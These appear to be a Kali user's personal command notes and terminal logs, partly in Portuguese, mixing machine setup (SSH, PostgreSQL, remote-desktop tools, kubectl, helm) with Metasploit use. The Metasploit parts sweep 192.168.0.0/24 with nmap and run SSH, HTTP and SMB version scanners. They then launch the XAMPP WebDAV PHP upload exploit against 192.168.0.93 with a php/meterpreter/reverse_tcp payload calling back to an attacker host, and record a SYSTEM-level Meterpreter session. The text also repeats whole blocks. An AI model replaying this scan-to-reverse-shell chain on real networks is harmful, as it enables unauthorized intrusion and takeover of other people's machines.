
apt update && apt upgrade -y
vim /etc/ssh/sshd_config
systemctl enable postgresql
systemctl start  postgresql
systemctl start sshd 
systemctl enable sshd 
systemctl restart systemd-resolved
service sshd start
service sshd restart


netstat -utplan|grep post
netstat -utplan|grep 22
wget https://anydesk.com/pt/downloads/thank-you?dv=deb_64
wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb
apt install ./google-chrome-stable_current_amd64.deb
apt install xbase-clients python3-psutil libgtkglext1 -y
dpkg -i anydesk_6.2.0-1_amd64.deb
dpkg -i chrome-remote-desktop_current_amd64.deb 

updatedb
apt autoremove
init 6





apt update && apt upgrade -y
vim /etc/ssh/sshd_config
systemctl enable postgresql
systemctl start  postgresql
systemctl start sshd 
systemctl enable sshd 
systemctl restart systemd-resolved
service sshd start
service sshd restart


netstat -utplan|grep post
netstat -utplan|grep 22
wget https://anydesk.com/pt/downloads/thank-you?dv=deb_64
wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb
apt install ./google-chrome-stable_current_amd64.deb
apt install xbase-clients python3-psutil libgtkglext1 -y
dpkg -i anydesk_6.2.0-1_amd64.deb
dpkg -i chrome-remote-desktop_current_amd64.deb 

updatedb
apt autoremove
init 6

msfconsole
db_connect -y /usr/share/metasploit-framework/config/database.yml # Connected to the database specified in the YAML file
workspace -a msftests
db_nmap -F 192.168.0.1-255
hosts
services
use auxiliary/scanner/ssh/ssh_version
#options 
services -u -p 22 -R
setg threads 10
run



sudo su -
hrlm
kubectl
sudo su -
curl -LO https://storage.googleapis.com/kubernetes-release/release/`curl -s https://storage.googleapis.com/kubernetes-release/release/stable.txt`/bin/linux/amd64/kubectl
chmod +x ./kubectl
sudo mv ./kubectl /usr/local/bin/kubectl
sudo su - 
curl -LO https://storage.googleapis.com/kubernetes-release/release/`curl -s https://storage.googleapis.com/kubernetes-release/release/stable.txt`/bin/linux/amd64/kubectl
chmod +x ./kubectl
sudo mv ./kubectl /usr/local/bin/kubectl
kubectl version --client
export KUBECONFIG=/home/valdis/kube.conf 
vim
vim /home/valdis/kube.conf 
cd /home/
ls
mkdir valdis
ls l-ha
ls -lha
sudo touch /home/valdis/kube.conf
sudo mkdir -P /home/valdis/kube.conf
sudo mkdir -R /home/valdis/kube.conf
sudo mkdir -p /home/valdis/kube.conf
cd valdis/
ls
cd kube.conf/
cd ..
rmdir kube.conf/
sudo rmdir kube.conf/
vim kube.conf
cd ..
sudo rmdir -p valdis/
ls -lhar
cd jmuniz/
ls
touch kube.config
vim kube.config 
export KUBECONFIG=/home/jmuniz/kube.conf 
set
set|grep kube
export KUBECONFIG=/home/jmuniz/kube.conf 
set|grep kube
unset KUBECONFIG=/home/jmuniz/kube.conf 
set|grep kube
kubectl cluster-info
cat /home/jmuniz/kube.conf
set|grep kube
ls
cd ..
ls
ls -lhanrp
cat /home/jmuniz/kube.conf
ls jmuniz/
cd jmuniz/
mv kube.config kube.conf
kubectl cluster-info
curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"
touch test
vim test
ls
pwd
curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"
sudo install -o root -g root -m 0755 kubectl /usr/local/bin/kubectl
kubectl version --client
kubecofig
kube config
kube onfig
kube
kube config
kubectl config
sudo apt-get update
sudo apt-get install -y apt-transport-https ca-certificates curl
sudo curl -fsSLo /usr/share/keyrings/kubernetes-archive-keyring.gpg https://packages.cloud.google.com/apt/doc/apt-key.gpg
echo "deb [signed-by=/usr/share/keyrings/kubernetes-archive-keyring.gpg] https://apt.kubernetes.io/ kubernetes-xenial main" | sudo tee /etc/apt/sources.list.d/kubernetes.list
sudo apt-get update
sudo apt-get install -y kubectl
kubectl
wget https://get.helm.sh/helm-v3.4.1-linux-amd64.tar.gz
tar xvf helm-v3.4.1-linux-amd64.tar.gz
sudo mv linux-amd64/helm /usr/local/bin
helm version
rm helm-v3.4.1-linux-amd64.tar.gz
rm -rf linux-amd64
kubectl get pod -A |grep post
kubectl config get-contexts
helm
kubectl
history
ls -lahr
cat bash_history
cat .bash_history
code .







msfconsole
db_connect -y /usr/share/metasploit-framework/config/database.yml # Connected to the database specified in the YAML file
workspace -a msftests
db_nmap -F 192.168.0.1-255
hosts
services

use auxiliary/scanner/ssh/ssh_version
#options 
services -u -p 22 -R
setg threads 10
run


use auxiliary/scanner/http/http_version 
#options       
services -u -p 80 -R  
run


use auxiliary/scanner/smb/smb_version 
#options          
services -u -p 445 -R      
run


hosts
services -u
services 192.168.0.93
search xampp



use exploit/windows/http/xampp_webdav_upload_php       
options
set rhosts 192.168.0.93
show payloads      
set payload php/meterpreter/reverse_tcp  
options
set lhost 192.168.0.15

exploit
[*] Meterpreter session 1 opened (192.168.0.15:4444 -> 192.168.0.6:51211)

meterpreter > ps 
meterpreter > getuid 
    Server username: SYSTEM (0)    
    meterpreter > sysinfo          
    Computer    : WIN7-X86         
    OS          : Windows NT WIN7
success

######tranformar em cat eof para automatizar
vim /usr/share/metasploit-framework/config/database.yml            

development:
  adapter: postgresql
  database: msf
  username: msf
  password: some-postgresql-token
  host: localhost
  port: 5432
  pool: 5
  timeout: 5

production:
  adapter: postgresql
  database: msf
  username: msf
  password: some-postgresql-token
  host: localhost
  port: 5432
  pool: 5
  timeout: 5

test:
  adapter: postgresql
  database: msf_test
  username: msf
  password: some-postgresql-token
  host: localhost
  port: 5432
  pool: 5
  timeout: 5
























apt update && apt upgrade -y
vim /etc/ssh/sshd_config
systemctl enable postgresql
systemctl start  postgresql
systemctl start sshd 
systemctl enable sshd 
systemctl restart systemd-resolved
service sshd start
service sshd restart


netstat -utplan|grep post
netstat -utplan|grep 22
wget https://anydesk.com/pt/downloads/thank-you?dv=deb_64
wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb
apt install ./google-chrome-stable_current_amd64.deb
apt install xbase-clients python3-psutil libgtkglext1 -y
dpkg -i anydesk_6.2.0-1_amd64.deb
dpkg -i chrome-remote-desktop_current_amd64.deb 

updatedb
apt autoremove
init 6

msfconsole
db_connect -y /usr/share/metasploit-framework/config/database.yml # Connected to the database specified in the YAML file
workspace -a msftests
db_nmap -F 192.168.0.1-255
hosts
services
use auxiliary/scanner/ssh/ssh_version
#options 
services -u -p 22 -R
setg threads 10
run









use auxiliary/scanner/http/http_version 
#options       
services -u -p 80 -R  
run

use auxiliary/scanner/smb/smb_version 
#options          
services -u -p 445 -R      
run

hosts
services -u
services 192.168.0.93
search xampp

use exploit/windows/http/xampp_webdav_upload_php       
options
set rhosts 192.168.0.93
show payloads      
set payload php/meterpreter/reverse_tcp  
options
set lhost 192.168.0.15

exploit
[*] Meterpreter session 1 opened (192.168.0.15:4444 -> 192.168.0.6:51211)

meterpreter > ps 
meterpreter > getuid 
    Server username: SYSTEM (0)    
    meterpreter > sysinfo          
    Computer    : WIN7-X86         
    OS          : Windows NT WIN7
success

######tranformar em cat eof para automatizar
vim /usr/share/metasploit-framework/config/database.yml            

development:
  adapter: postgresql
  database: msf
  username: msf
  password: some-postgresql-token
  host: localhost
  port: 5432
  pool: 5
  timeout: 5

production:
  adapter: postgresql
  database: msf
  username: msf
  password: some-postgresql-token
  host: localhost
  port: 5432
  pool: 5
  timeout: 5

test:
  adapter: postgresql
  database: msf_test
  username: msf
  password: some-postgresql-token
  host: localhost
  port: 5432
  pool: 5
  timeout: 5







$$$$$$$$$$$$$$$$$$$$$$$$$
LOGS
~]
└─$ cat 
                                                                                                               
┌──(mac㉿kaliDell)-[~]
└─$ sudo su -                              
[sudo] senha para mac: 
┌──(root㉿kaliDell)-[~]
└─# cat /usr/share/metasploit-framework/config/database.yml            

development:
  adapter: postgresql
  database: msf
  username: msf
  password: some-postgresql-token
  host: localhost
  port: 5432
  pool: 5
  timeout: 5

production:
  adapter: postgresql
  database: msf
  username: msf
  password: some-postgresql-token
  host: localhost
  port: 5432
  pool: 5
  timeout: 5

test:
  adapter: postgresql
  database: msf_test
  username: msf
  password: some-postgresql-token
  host: localhost
  port: 5432
  pool: 5
  timeout: 5
  














metasploit



msf6 > history
1   search cve:2009 type:exploit
2   history
3   workspace -a msftests
4   db_status
5   db_connect
6   /usr/share/metasploit-framework/config/database.yml
7   db_connect -y /usr/share/metasploit-framework/config/database.yml
8   db_status
9   db_connect -y /usr/share/metasploit-framework/config/database.yml
10  db_status
11  db_connect -y /usr/share/metasploit-framework/config/database.yml
12  /]
13  db_connect -y /usr/share/metasploit-framework/config/database.yml
14  db_connect msf_user:123456:@127.0.0.1:5432/msf_database
15  db_status
16  db_connect msf_user:123456:@127.0.0.1:5432/msf_database
17  db_connect -y /usr/share/metasploit-framework/config/database.yml
18  workspace -a msftests
19  db_nmap -F 192.168.0.1-10
20  db_nmap -F 192.168.0.1-255
21  hosts
22  services
23  history
msf6 > workspace -a claro
[*] Added workspace: claro
[*] Workspace: claro
msf6 > db_nmap -F 192.168.0.1-255
[*] Nmap: Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-07 16:54 -03
[*] Nmap: Nmap scan report for 192.168.0.1
[*] Nmap: Host is up (0.030s latency).
[*] Nmap: Not shown: 96 closed tcp ports (reset)
[*] Nmap: PORT     STATE    SERVICE
[*] Nmap: 80/tcp   open     http
[*] Nmap: 139/tcp  filtered netbios-ssn
[*] Nmap: 443/tcp  open     https
[*] Nmap: 5000/tcp open     upnp
[*] Nmap: MAC Address: C8:5D:38:5C:3A:2A (Humax)
[*] Nmap: Nmap scan report for 192.168.0.40
[*] Nmap: Host is up (0.015s latency).
[*] Nmap: Not shown: 99 filtered tcp ports (no-response)
[*] Nmap: PORT     STATE SERVICE
[*] Nmap: 7070/tcp open  realserver
[*] Nmap: MAC Address: 00:E0:4C:F0:C4:BF (Realtek Semiconductor)
[*] Nmap: Nmap scan report for 192.168.0.62
[*] Nmap: Host is up (0.068s latency).
[*] Nmap: Not shown: 99 closed tcp ports (reset)
[*] Nmap: PORT     STATE SERVICE
[*] Nmap: 7070/tcp open  realserver
[*] Nmap: MAC Address: 48:D8:90:3B:FC:84 (Fn-link Technology Limited)
[*] Nmap: Nmap scan report for 192.168.0.85
[*] Nmap: Host is up (0.052s latency).
[*] Nmap: Not shown: 99 filtered tcp ports (no-response)
[*] Nmap: PORT     STATE SERVICE
[*] Nmap: 7070/tcp open  realserver
[*] Nmap: MAC Address: 4C:EB:BD:6B:51:0F (Chongqing Fugui Electronics)
[*] Nmap: Nmap scan report for 192.168.0.93
[*] Nmap: Host is up (0.063s latency).
[*] Nmap: Not shown: 99 filtered tcp ports (no-response)
[*] Nmap: PORT    STATE SERVICE
[*] Nmap: 139/tcp open  netbios-ssn
[*] Nmap: MAC Address: 9C:30:5B:FC:1F:53 (Hon Hai Precision Ind.)
[*] Nmap: Nmap scan report for 192.168.0.188
[*] Nmap: Host is up (0.11s latency).
[*] Nmap: Not shown: 99 filtered tcp ports (no-response)
[*] Nmap: PORT     STATE SERVICE
[*] Nmap: 7070/tcp open  realserver
[*] Nmap: MAC Address: 2C:D2:6B:0B:9D:B7 (Fn-link Technology Limited)
[*] Nmap: Nmap scan report for 192.168.0.99
[*] Nmap: Host is up (0.0000050s latency).
[*] Nmap: Not shown: 98 closed tcp ports (reset)
[*] Nmap: PORT     STATE SERVICE
[*] Nmap: 22/tcp   open  ssh
[*] Nmap: 7070/tcp open  realserver
[*] Nmap: Nmap done: 255 IP addresses (7 hosts up) scanned in 69.93 seconds
msf6 > hosts

Hosts
=====

address        mac                name  os_name  os_flavor  os_sp  purpose  info  comments
-------        ---                ----  -------  ---------  -----  -------  ----  --------
192.168.0.1    c8:5d:38:5c:3a:2a        Unknown                    device
192.168.0.40   00:e0:4c:f0:c4:bf        Unknown                    device
192.168.0.62   48:d8:90:3b:fc:84        Unknown                    device
192.168.0.85   4c:eb:bd:6b:51:0f        Unknown                    device
192.168.0.93   9c:30:5b:fc:1f:53        Unknown                    device
192.168.0.99                            Unknown                    device
192.168.0.188  2c:d2:6b:0b:9d:b7        Unknown                    device

msf6 > services
Services
========

host           port  proto  name         state     info
----           ----  -----  ----         -----     ----
192.168.0.1    80    tcp    http         open
192.168.0.1    139   tcp    netbios-ssn  filtered
192.168.0.1    443   tcp    https        open
192.168.0.1    5000  tcp    upnp         open
192.168.0.40   7070  tcp    realserver   open
192.168.0.62   7070  tcp    realserver   open
192.168.0.85   7070  tcp    realserver   open
192.168.0.93   139   tcp    netbios-ssn  open
192.168.0.99   22    tcp    ssh          open
192.168.0.99   7070  tcp    realserver   open
192.168.0.188  7070  tcp    realserver   open

msf6 > service
[*] exec: service

Usage: service < option > | --status-all | [ service_name [ command | --full-restart ] ]
msf6 > service --status-all
[*] exec: service --status-all

 [ - ]  apache-htcacheclean
 [ - ]  apache2
 [ - ]  apparmor
 [ - ]  atftpd
 [ - ]  avahi-daemon
 [ - ]  bluetooth
 [ - ]  chrome-remote-desktop
 [ - ]  console-setup.sh
 [ + ]  cron
 [ - ]  cryptdisks
 [ - ]  cryptdisks-early
 [ + ]  dbus
 [ - ]  dns2tcp
 [ + ]  haveged
 [ - ]  hwclock.sh
 [ - ]  inetsim
 [ - ]  iodined
 [ - ]  ipsec
 [ - ]  keyboard-setup.sh
 [ + ]  kmod
 [ + ]  lightdm
 [ - ]  lvm2
 [ - ]  lvm2-lvmpolld
 [ - ]  mariadb
 [ - ]  miredo
 [ + ]  networking
 [ - ]  nfs-common
 [ - ]  nginx
 [ - ]  nmbd
 [ - ]  openvpn
 [ - ]  plymouth
 [ + ]  plymouth-log
 [ + ]  postgresql
 [ + ]  procps
 [ - ]  ptunnel
 [ - ]  pulseaudio-enable-autospawn
 [ - ]  redis-server
 [ - ]  redsocks
 [ - ]  rpcbind
 [ - ]  rsync
 [ - ]  rwhod
 [ - ]  samba-ad-dc
 [ - ]  saned
 [ - ]  screen-cleanup
 [ + ]  smartmontools
 [ - ]  smbd
 [ - ]  snmpd
 [ - ]  speech-dispatcher
 [ + ]  ssh
 [ - ]  sslh
 [ - ]  stunnel4
 [ - ]  sudo
 [ - ]  sysstat
 [ + ]  udev
 [ - ]  x11-common
 [ - ]  xl2tpd
msf6 > use auxiliary/scanner/ssh/ssh_version
msf6 auxiliary(scanner/ssh/ssh_version) > services -u -p 22 -R
Services
========

host          port  proto  name  state  info
----          ----  -----  ----  -----  ----
192.168.0.99  22    tcp    ssh   open

RHOSTS => 192.168.0.99

msf6 auxiliary(scanner/ssh/ssh_version) > setg threads 10
threads => 10
msf6 auxiliary(scanner/ssh/ssh_version) > service
[*] exec: service

Usage: service < option > | --status-all | [ service_name [ command | --full-restart ] ]
msf6 auxiliary(scanner/ssh/ssh_version) > services
Services
========

host           port  proto  name         state     info
----           ----  -----  ----         -----     ----
192.168.0.1    80    tcp    http         open
192.168.0.1    139   tcp    netbios-ssn  filtered
192.168.0.1    443   tcp    https        open
192.168.0.1    5000  tcp    upnp         open
192.168.0.40   7070  tcp    realserver   open
192.168.0.62   7070  tcp    realserver   open
192.168.0.85   7070  tcp    realserver   open
192.168.0.93   139   tcp    netbios-ssn  open
192.168.0.99   22    tcp    ssh          open
192.168.0.99   7070  tcp    realserver   open
192.168.0.188  7070  tcp    realserver   open

msf6 auxiliary(scanner/ssh/ssh_version) > services -u -p 22 7070  -R
[-] Invalid host parameter, 7070.
msf6 auxiliary(scanner/ssh/ssh_version) > options

Module options (auxiliary/scanner/ssh/ssh_version):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS   192.168.0.99     yes       The target host(s), see https://github.com/rapid7/metasploit-framework
                                       /wiki/Using-Metasploit
   RPORT    22               yes       The target port (TCP)
   THREADS  10               yes       The number of concurrent threads (max one per host)
   TIMEOUT  30               yes       Timeout for the SSH probe

msf6 auxiliary(scanner/ssh/ssh_version) > services -u -p 22  -R
Services
========

host          port  proto  name  state  info
----          ----  -----  ----  -----  ----
192.168.0.99  22    tcp    ssh   open

RHOSTS => 192.168.0.99

msf6 auxiliary(scanner/ssh/ssh_version) > db_nmap -F 192.168.0.1-255
[*] Nmap: Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-07 17:19 -03
[*] Nmap: Nmap scan report for 192.168.0.1
[*] Nmap: Host is up (0.011s latency).
[*] Nmap: Not shown: 96 closed tcp ports (reset)
[*] Nmap: PORT     STATE    SERVICE
[*] Nmap: 80/tcp   open     http
[*] Nmap: 139/tcp  filtered netbios-ssn
[*] Nmap: 443/tcp  open     https
[*] Nmap: 5000/tcp open     upnp
[*] Nmap: MAC Address: C8:5D:38:5C:3A:2A (Humax)
[*] Nmap: Nmap scan report for 192.168.0.40
[*] Nmap: Host is up (0.0092s latency).
[*] Nmap: Not shown: 99 filtered tcp ports (no-response)
[*] Nmap: PORT     STATE SERVICE
[*] Nmap: 7070/tcp open  realserver
[*] Nmap: MAC Address: 00:E0:4C:F0:C4:BF (Realtek Semiconductor)
[*] Nmap: Nmap scan report for 192.168.0.62
[*] Nmap: Host is up (0.0081s latency).
[*] Nmap: Not shown: 99 closed tcp ports (reset)
[*] Nmap: PORT     STATE SERVICE
[*] Nmap: 7070/tcp open  realserver
[*] Nmap: MAC Address: 48:D8:90:3B:FC:84 (Fn-link Technology Limited)
[*] Nmap: Nmap scan report for 192.168.0.85
[*] Nmap: Host is up (0.061s latency).
[*] Nmap: Not shown: 99 filtered tcp ports (no-response)
[*] Nmap: PORT     STATE SERVICE
[*] Nmap: 7070/tcp open  realserver
[*] Nmap: MAC Address: 4C:EB:BD:6B:51:0F (Chongqing Fugui Electronics)
[*] Nmap: Nmap scan report for 192.168.0.93
[*] Nmap: Host is up (0.054s latency).
[*] Nmap: Not shown: 99 filtered tcp ports (no-response)
[*] Nmap: PORT    STATE SERVICE
[*] Nmap: 445/tcp open  microsoft-ds
[*] Nmap: MAC Address: 9C:30:5B:FC:1F:53 (Hon Hai Precision Ind.)
[*] Nmap: Nmap scan report for 192.168.0.173
[*] Nmap: Host is up (0.095s latency).
[*] Nmap: Not shown: 99 filtered tcp ports (no-response)
[*] Nmap: PORT     STATE SERVICE
[*] Nmap: 7070/tcp open  realserver
[*] Nmap: MAC Address: 00:D7:6D:57:59:5E (Intel Corporate)
[*] Nmap: Nmap scan report for 192.168.0.188
[*] Nmap: Host is up (0.088s latency).
[*] Nmap: Not shown: 99 filtered tcp ports (no-response)
[*] Nmap: PORT     STATE SERVICE
[*] Nmap: 7070/tcp open  realserver
[*] Nmap: MAC Address: 2C:D2:6B:0B:9D:B7 (Fn-link Technology Limited)
[*] Nmap: Nmap scan report for 192.168.0.99
[*] Nmap: Host is up (0.0000080s latency).
[*] Nmap: Not shown: 98 closed tcp ports (reset)
[*] Nmap: PORT     STATE SERVICE
[*] Nmap: 22/tcp   open  ssh
[*] Nmap: 7070/tcp open  realserver
[*] Nmap: Nmap done: 255 IP addresses (8 hosts up) scanned in 63.67 seconds
msf6 auxiliary(scanner/ssh/ssh_version) > hosts

Hosts
=====

address        mac                name  os_name  os_flavor  os_sp  purpose  info  comments
-------        ---                ----  -------  ---------  -----  -------  ----  --------
192.168.0.1    C8:5D:38:5C:3A:2A        Unknown                    device
192.168.0.40   00:E0:4C:F0:C4:BF        Unknown                    device
192.168.0.62   48:D8:90:3B:FC:84        Unknown                    device
192.168.0.85   4C:EB:BD:6B:51:0F        Unknown                    device
192.168.0.93   9c:30:5b:fc:1f:53        Unknown                    device
192.168.0.99                            Unknown                    device
192.168.0.173  00:d7:6d:57:59:5e        Unknown                    device
192.168.0.188  2C:D2:6B:0B:9D:B7        Unknown                    device

msf6 auxiliary(scanner/ssh/ssh_version) > services
Services
========

host           port  proto  name          state     info
----           ----  -----  ----          -----     ----
192.168.0.1    80    tcp    http          open
192.168.0.1    139   tcp    netbios-ssn   filtered
192.168.0.1    443   tcp    https         open
192.168.0.1    5000  tcp    upnp          open
192.168.0.40   7070  tcp    realserver    open
192.168.0.62   7070  tcp    realserver    open
192.168.0.85   7070  tcp    realserver    open
192.168.0.93   139   tcp    netbios-ssn   open
192.168.0.93   445   tcp    microsoft-ds  open
192.168.0.99   22    tcp    ssh           open
192.168.0.99   7070  tcp    realserver    open
192.168.0.173  7070  tcp    realserver    open
192.168.0.188  7070  tcp    realserver    open

msf6 auxiliary(scanner/ssh/ssh_version) > services -u -p 22 -R
Services
========

host          port  proto  name  state  info
----          ----  -----  ----  -----  ----
192.168.0.99  22    tcp    ssh   open

RHOSTS => 192.168.0.99

msf6 auxiliary(scanner/ssh/ssh_version) > setg threads 10
threads => 10
msf6 auxiliary(scanner/ssh/ssh_version) > run

[+] 192.168.0.99:22       - SSH server version: SSH-2.0-OpenSSH_9.0p1 Debian-1+b1
[*] 192.168.0.99:22       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/ssh/ssh_version) > save
Saved configuration to: /root/.msf4/config
msf6 auxiliary(scanner/ssh/ssh_version) > use auxiliary/scanner/http/http_version 
msf6 auxiliary(scanner/http/http_version) > options

Module options (auxiliary/scanner/http/http_version):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                    yes       The target host(s), see https://github.com/rapid7/metasploit-framework
                                       /wiki/Using-Metasploit
   RPORT    80               yes       The target port (TCP)
   SSL      false            no        Negotiate SSL/TLS for outgoing connections
   THREADS  10               yes       The number of concurrent threads (max one per host)
   VHOST                     no        HTTP server virtual host

msf6 auxiliary(scanner/http/http_version) > services -u -p 80 -R  
Services                                                                                                                             
========                                                                                                                             

host         port  proto  name  state  info
----         ----  -----  ----  -----  ----
192.168.0.1  80    tcp    http  open

RHOSTS => 192.168.0.1

msf6 auxiliary(scanner/http/http_version) > use auxiliary/scanner/smb/smb_version   
msf6 auxiliary(scanner/smb/smb_version) > services -u -p 445 -R   
Services
========

host          port  proto  name          state  info
----          ----  -----  ----          -----  ----
192.168.0.93  445   tcp    microsoft-ds  open

RHOSTS => 192.168.0.93

msf6 auxiliary(scanner/smb/smb_version) > run

[*] 192.168.0.93:445      - SMB Detected (versions:2, 3) (preferred dialect:SMB 3.1.1) (compression capabilities:LZNT1) (encryption capabilities:AES-128-GCM) (signatures:optional) (guid:{871b726c-666a-4d5d-be7c-880ef430ace9}) (authentication domain:QINTESS)
[*] 192.168.0.93:         - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/smb/smb_version) > hosts

Hosts
=====

address        mac                name  os_name  os_flavor  os_sp  purpose  info  comments
-------        ---                ----  -------  ---------  -----  -------  ----  --------
192.168.0.1    C8:5D:38:5C:3A:2A        Unknown                    device
192.168.0.40   00:E0:4C:F0:C4:BF        Unknown                    device
192.168.0.62   48:D8:90:3B:FC:84        Unknown                    device
192.168.0.85   4C:EB:BD:6B:51:0F        Unknown                    device
192.168.0.93   9c:30:5b:fc:1f:53        Unknown                    device
192.168.0.99                            Unknown                    device
192.168.0.173  00:d7:6d:57:59:5e        Unknown                    device
192.168.0.188  2C:D2:6B:0B:9D:B7        Unknown                    device

msf6 auxiliary(scanner/smb/smb_version) > services -u
Services
========

host           port  proto  name          state  info
----           ----  -----  ----          -----  ----
192.168.0.1    80    tcp    http          open
192.168.0.1    443   tcp    https         open
192.168.0.1    5000  tcp    upnp          open
192.168.0.40   7070  tcp    realserver    open
192.168.0.62   7070  tcp    realserver    open
192.168.0.85   7070  tcp    realserver    open
192.168.0.93   139   tcp    netbios-ssn   open
192.168.0.93   445   tcp    microsoft-ds  open
192.168.0.99   22    tcp    ssh           open   SSH-2.0-OpenSSH_9.0p1 Debian-1+b1
192.168.0.99   7070  tcp    realserver    open
192.168.0.173  7070  tcp    realserver    open
192.168.0.188  7070  tcp    realserver    open

msf6 auxiliary(scanner/smb/smb_version) > services 192.168.0.93
Services
========

host          port  proto  name          state  info
----          ----  -----  ----          -----  ----
192.168.0.93  139   tcp    netbios-ssn   open
192.168.0.93  445   tcp    microsoft-ds  open

msf6 auxiliary(scanner/smb/smb_version) > search xamp

Matching Modules
================

   #   Name                                                Disclosure Date  Rank       Check  Description
   -   ----                                                ---------------  ----       -----  -----------
   0   exploit/multi/http/atutor_upload_traversal          2019-05-17       excellent  Yes    ATutor 2.2.4 - Directory Traversal / Remote Code Execution,
   1   exploit/android/browser/stagefright_mp4_tx3g_64bit  2015-08-13       normal     No     Android Stagefright MP4 tx3g Integer Overflow
   2   exploit/multi/http/struts2_code_exec_showcase       2017-07-07       excellent  Yes    Apache Struts 2 Struts 1 Plugin Showcase OGNL Code Execution
   3   auxiliary/admin/http/tomcat_ghostcat                2020-02-20       normal     Yes    Apache Tomcat AJP File Read
   4   exploit/multi/http/tomcat_mgr_deploy                2009-11-09       excellent  Yes    Apache Tomcat Manager Application Deployer Authenticated Code Execution
   5   exploit/multi/http/tomcat_mgr_upload                2009-11-09       excellent  Yes    Apache Tomcat Manager Authenticated Upload Code Execution
   6   exploit/windows/misc/itunes_extm3u_bof              2012-06-21       normal     No     Apple iTunes 10 Extended M3U Stack Buffer Overflow
   7   auxiliary/server/capture/http_javascript_keylogger                   normal     No     Capture: HTTP JavaScript Keylogger
   8   auxiliary/scanner/smb/impacket/dcomexec             2018-03-19       normal     No     DCOM Exec
   9   auxiliary/scanner/smb/impacket/secretsdump                           normal     No     DCOM Exec
   10  post/windows/manage/dell_memory_protect                              manual     No     Dell DBUtilDrv2.sys Memory Protection Modifier
   11  auxiliary/gather/get_user_spns                      2014-09-27       normal     No     Gather Ticket Granting Service (TGS) tickets for User Service Principal Names (SPN)
   12  exploit/multi/http/getsimplecms_unauth_code_exec    2019-04-28       excellent  Yes    GetSimpleCMS Unauthenticated RCE
   13  exploit/windows/misc/hp_dataprotector_new_folder    2012-03-12       normal     No     HP Data Protector Create New Folder Buffer Overflow
   14  auxiliary/server/browser_autopwn2                   2015-07-05       normal     No     HTTP Client Automatic Exploiter 2 (Browser Autopwn)
   15  auxiliary/server/http_ntlmrelay                                      normal     No     HTTP Client MS Credential Relayer
   16  auxiliary/scanner/http/prev_dir_same_name_file                       normal     No     HTTP Previous Directory File Scanner
   17  auxiliary/server/icmp_exfil                                          normal     No     ICMP Exfiltration Service
   18  exploit/unix/fileformat/imagemagick_delegate        2016-05-03       excellent  No     ImageMagick Delegate Arbitrary Command Execution
   19  exploit/multi/browser/java_rhino                    2011-10-18       excellent  No     Java Applet Rhino Script Engine Remote Code Execution
   20  exploit/linux/local/ptrace_traceme_pkexec_helper    2019-07-04       excellent  Yes    Linux Polkit pkexec helper PTRACE_TRACEME local root exploit
   21  exploit/multi/http/lcms_php_exec                    2011-03-03       excellent  Yes    LotusCMS 3.0 eval() Remote Command Execution
   22  auxiliary/scanner/mssql/mssql_schemadump                             normal     No     MSSQL Schema Dump
   23  exploit/multi/http/git_client_command_exec          2014-12-18       excellent  No     Malicious Git and Mercurial HTTP Server For CVE-2014-9390
   24  exploit/multi/http/maracms_upload_exec              2020-08-31       excellent  Yes    MaraCMS Arbitrary PHP File Upload
   25  exploit/windows/mssql/mssql_payload_sqli            2000-05-30       excellent  No     Microsoft SQL Server Payload Execution via SQL Injection
   26  auxiliary/scanner/scada/moxa_discover                                normal     No     Moxa UDP Device Discovery
   27  auxiliary/gather/nis_ypserv_map                                      normal     No     NIS ypserv Map Dumper
   28  auxiliary/server/dns/native_server                                   normal     No     Native DNS Server (Example)
   29  auxiliary/spoof/dns/native_spoofer                                   normal     No     Native DNS Spoofer (Example)
   30  auxiliary/server/ldap                                                normal     No     Native LDAP Server (Example)
   31  auxiliary/server/netbios_spoof_nat                  2016-06-14       normal     No     NetBIOS Response "BadTunnel" Brute Force Spoof (NAT Tunnel)
   32  auxiliary/admin/netbios/netbios_spoof                                normal     No     NetBIOS Response Brute Force Spoof (Direct)
   33  post/osx/gather/enum_adium                                           normal     No     OS X Gather Adium Enumeration
   34  post/osx/gather/enum_colloquy                                        normal     No     OS X Gather Colloquy Enumeration
   35  auxiliary/scanner/http/owa_ews_login                                 normal     No     OWA Exchange Web Services (EWS) Login Scanner
   36  exploit/multi/http/oracle_reports_rce               2014-01-15       great      Yes    Oracle Forms and Reports Remote Code Execution
   37  exploit/windows/email/ms10_045_outlook_ref_only     2010-06-01       excellent  No     Outlook ATTACH_BY_REF_ONLY File Execution
   38  exploit/windows/email/ms10_045_outlook_ref_resolve  2010-06-01       excellent  No     Outlook ATTACH_BY_REF_RESOLVE File Execution
   39  exploit/windows/mysql/scrutinizer_upload_exec       2012-07-27       excellent  Yes    Plixer Scrutinizer NetFlow and sFlow Analyzer 9 Default MySQL Credential
   40  exploit/unix/smtp/qmail_bash_env_exec               2014-09-24       normal     No     Qmail SMTP Bash Environment Variable Injection (Shellshock)
   41  exploit/linux/redis/redis_debian_sandbox_escape     2022-02-18       excellent  Yes    Redis Lua Sandbox Escape
   42  encoder/x86/service                                                  manual     No     Register Service
   43  exploit/multi/http/rails_dynamic_render_code_exec   2016-10-16       excellent  Yes    Ruby on Rails Dynamic Render File Upload Remote Code Execution
   44  auxiliary/admin/dcerpc/samr_computer                                 normal     No     SAMR Computer Management
   45  auxiliary/admin/smb/check_dir_file                                   normal     No     SMB Scanner Check File/Directory Utility
   46  exploit/linux/local/service_persistence             1983-01-01       excellent  No     Service Persistence
   47  auxiliary/scanner/http/squid_pivot_scanning                          normal     No     Squid Proxy Port Scanner
   48  exploit/solaris/sunrpc/sadmind_adm_build_path       2008-10-14       great      No     Sun Solaris sadmind adm_build_path() Buffer Overflow
   49  auxiliary/voip/telisca_ips_lock_control             2015-12-17       normal     No     Telisca IPS Lock Cisco IP Phone Control
